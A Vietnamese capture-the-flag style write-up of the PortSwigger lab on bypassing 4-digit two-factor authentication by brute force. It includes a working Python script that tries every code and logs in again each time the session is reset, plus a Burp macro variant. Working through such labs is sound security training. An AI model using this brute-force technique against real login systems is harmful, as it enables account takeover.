![[auth-2fa-brute.png]]
-mô tả lab: lab cho sẵn `carlos:montoya`, mã 2FA là 4 số. Server có cơ chế logout nếu nhập sai nhiều lần, nhưng mình vẫn brute được bằng macro.

> [!NOTE]
> -link lab: https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-bypass-using-a-brute-force-attack

### hướng giải
- [ ] mình login `carlos:montoya`, mình thấy nó vào `/login2` bắt nhập mã
- [ ] mình brute thử 10 mã, mình thấy tới lần sai thứ 3-4 là nó đá mình về `/login`, bắt login lại
- [ ] => nên mình hiểu là server nó đếm số lần sai theo session, logout là reset đếm. Vậy mình chỉ cần auto login lại sau mỗi 2 lần thử là brute được
- [ ] nên mình dùng Burp Macro + Intruder, hoặc mình viết script python giữ session

### giải
-cách của mình dùng python cho nhanh, vì mình không quen set macro lắm:
```python
import requests
s = requests.Session()
# bước 1: login để lấy session có quyền vào login2
r = s.post("https://LAB-ID.web-security-academy.net/login",
    data={"username":"carlos","password":"montoya"})
print("sau khi login, mình thấy cookie:", s.cookies.get_dict())

# bước 2: brute 0000 -> 9999
for code in range(10000):
    mfa = f"{code:04d}"
    r2 = s.post("https://LAB-ID.web-security-academy.net/login2",
        data={"mfa-code": mfa}, allow_redirects=False)
    # sau khi quan sát gói tin này, mình thấy sai thì nó 200 + Incorrect, đúng thì 302 về /my-account
    if r2.status_code == 302:
        print(f"trúng mã {mfa}")
        break
    # nếu bị logout (response về /login), mình login lại
    if "login" in r2.text.lower() and "incorrect" not in r2.text.lower():
        s.post("https://LAB-ID.web-security-academy.net/login",
            data={"username":"carlos","password":"montoya"})
```
![[auth-2fa-brute-success.png]]
-mình chạy 1 lúc là ra mã, ví dụ `1234`, mình nhập tay vào `/login2` là solve.

> [!NOTE]
> -nếu dùng Burp: mình tạo Macro auto-login trong Project options -> Sessions, rồi cho Intruder brute `mfa-code` từ 0000-9999, bật Update-Cookie. Cách nào cũng được, miễn là giữ session không bị đá.
> -bài học của mình: mã 4 số mà không có rate-limit cứng thì brute 10k request là ra, logout không ăn thua.
